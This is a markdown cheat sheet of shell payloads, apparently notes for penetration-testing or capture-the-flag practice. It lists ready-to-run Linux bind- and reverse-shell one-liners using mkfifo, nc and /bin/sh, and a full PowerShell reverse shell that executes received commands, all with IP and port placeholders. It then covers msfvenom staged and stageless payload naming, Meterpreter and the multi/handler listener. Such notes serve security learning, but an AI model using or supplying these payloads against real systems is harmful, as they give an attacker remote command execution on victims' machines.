# Shell Payload

## Alternative to "-e - execute " flag in nc win/linux ( to be run on Victim machine )

- Creating a bind shell for linux 

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

  (It creates a pipe and then starts the nc listner/executes the command)


- Creating a Reverse shell for Linux

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

### Nc using pipe for windows
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

Replace the "IP" & "Port"

# Msfvenom

1. **Staged** payloads are sent in two parts. The first part is called the stager, It does not contain the payload but rather run's and downloads the payload.
Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective


2. **Stageless** payloads are more common, They are entirely self-contained in that there is one piece of code which sends a shell back immediately to the waiting listener.


## Msfvenom payload naming

 `<OS>/<arch>/<payload>`

**stageless payload** = `shell_reverse_tcp` *Stageless payloads are denoted with underscores (_)*

**Staged payload = `shell/reverse_tcp` *As staged payloads are denoted with another forward slash (/)*


This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

`windows/x64/meterpreter/reverse_tcp`

A Linux 32bit stageless Meterpreter payload would look like this:

`linux/x86/meterpreter_reverse_tcp`

Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

`msfvenom --list payloads`

This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.

`msfvenom --list payloads | grep "linux/x86/meterpreter"


# Meterpreter 

- Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with **Windows targets**
 - If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell.
  - Downside to meterpreter shells is that they must be caught in Metasploit.


# msf multi/handler

Multi/Handler is a superb tool for catching reverse shells, easy to use for a staged payload

Use : Type `use multi/handler`, and press **enter**


